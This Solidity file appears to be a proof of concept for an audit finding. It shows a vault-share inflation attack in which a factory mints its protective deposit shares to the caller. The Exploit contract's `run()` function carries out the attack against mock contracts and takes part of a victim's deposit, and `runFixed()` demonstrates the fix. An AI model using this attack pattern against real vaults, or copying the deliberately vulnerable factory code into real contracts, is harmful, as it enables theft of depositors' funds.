// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Peapods H-2 (Sherlock 2025-01, issue 166).
    AutoCompoundingPodLpFactory._depositMin mints the inflation-protection
    shares to msg.sender. The caller withdraws them, donates 1 asset, and
    rounds the vault to 1 share against 3^n+1 assets. The next depositor's
    20 ether mints 1 share and the attacker redeems half of it.
*/

contract Asset {
    string public symbol = "LP";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract AutoCompoundingPodLp {
    Asset public asset;
    uint256 public totalSupply;
    uint256 public totalAssets;
    mapping(address => uint256) public balanceOf;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 supply = totalSupply;
        if (supply == 0) shares = assets;
        else shares = assets * supply / totalAssets;
        totalAssets += assets;
        totalSupply = supply + shares;
        balanceOf[receiver] += shares;
        asset.transferFrom(msg.sender, address(this), assets);
    }

    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares) {
        shares = _divUp(assets * totalSupply, totalAssets);
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        totalAssets -= assets;
        asset.transfer(receiver, assets);
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        assets = shares * totalAssets / totalSupply;
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        totalAssets -= assets;
        asset.transfer(receiver, assets);
    }

    function increase() external {
        totalAssets += 1;
    }

    function _divUp(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a + b - 1) / b;
    }
}

contract Factory {
    Asset public asset;
    AutoCompoundingPodLp public vault;
    uint256 public constant minimumDepositAtCreation = 1000;

    constructor(Asset _asset, AutoCompoundingPodLp _vault) {
        asset = _asset;
        vault = _vault;
    }

    function _depositMin() external {
        asset.transferFrom(msg.sender, address(this), minimumDepositAtCreation);
        asset.approve(address(vault), minimumDepositAtCreation);
        // @> VULN: the dead shares are minted to the caller, so they can be withdrawn
        vault.deposit(minimumDepositAtCreation, msg.sender);
    }

    function _depositMinFixed(address dead) external {
        asset.transferFrom(msg.sender, address(this), minimumDepositAtCreation);
        asset.approve(address(vault), minimumDepositAtCreation);
        vault.deposit(minimumDepositAtCreation, dead);
    }
}

contract Victim {
    Asset public asset;
    AutoCompoundingPodLp public vault;

    constructor(Asset _asset, AutoCompoundingPodLp _vault) {
        asset = _asset;
        vault = _vault;
    }

    function depositAll() external {
        asset.approve(address(vault), 20 ether);
        vault.deposit(20 ether, address(this));
    }

    function redeemAll() external {
        vault.redeem(vault.balanceOf(address(this)), address(this), address(this));
    }
}

contract Exploit {
    Asset public asset;
    AutoCompoundingPodLp public vault;
    Factory public factory;
    Victim public victim;
    uint256 public attackerProfit;
    uint256 public victimLoss;
    uint256 public constant SEED = 20 ether;
    uint256 public constant STOLEN = 3921167270471535599;

    constructor() {
        asset = new Asset();
        vault = new AutoCompoundingPodLp(asset);
        factory = new Factory(asset, vault);
        victim = new Victim(asset, vault);
        asset.mint(address(this), SEED);
        asset.mint(address(victim), SEED);
    }

    function run() external {
        asset.approve(address(factory), 1000);
        factory._depositMin();
        vault.increase();
        asset.transfer(address(vault), 1);
        vault.withdraw(1000 - 1, address(this), address(this));
        require(vault.totalAssets() == 2, "two");
        require(vault.totalSupply() == 1, "one");
        for (uint256 i; i < 40; i++) {
            uint256 assetsToDeposit = vault.totalAssets() * 2 - 1;
            asset.approve(address(vault), assetsToDeposit);
            vault.deposit(assetsToDeposit, address(this));
            vault.withdraw(1, address(this), address(this));
        }
        require(vault.totalAssets() == 12157665459056928802, "inflated");
        require(vault.totalSupply() == 1, "share");
        victim.depositAll();
        require(vault.totalSupply() == 2, "victimShare");
        vault.redeem(1, address(this), address(this));
        victim.redeemAll();
        victimLoss = SEED - asset.balanceOf(address(victim));
        require(victimLoss == STOLEN, "loss");
        require(asset.balanceOf(address(this)) == SEED + STOLEN, "gain");
        attackerProfit = asset.balanceOf(address(this)) - SEED;
        require(attackerProfit == STOLEN, "profit");
        require(vault.totalSupply() == 0, "empty");
    }

    function runFixed() external {
        asset.approve(address(factory), 1000);
        factory._depositMinFixed(address(0xdead));
        asset.approve(address(vault), SEED - 1000);
        vault.deposit(SEED - 1000, address(this));
        uint256 shares = vault.balanceOf(address(this));
        vault.redeem(shares, address(this), address(this));
        require(asset.balanceOf(address(this)) == SEED - 1000, "kept");
        require(vault.balanceOf(address(this)) == 0, "noShare");
        require(vault.balanceOf(address(0xdead)) == 1000, "dead");
        require(vault.totalAssets() == 1000, "stuck");
    }
}
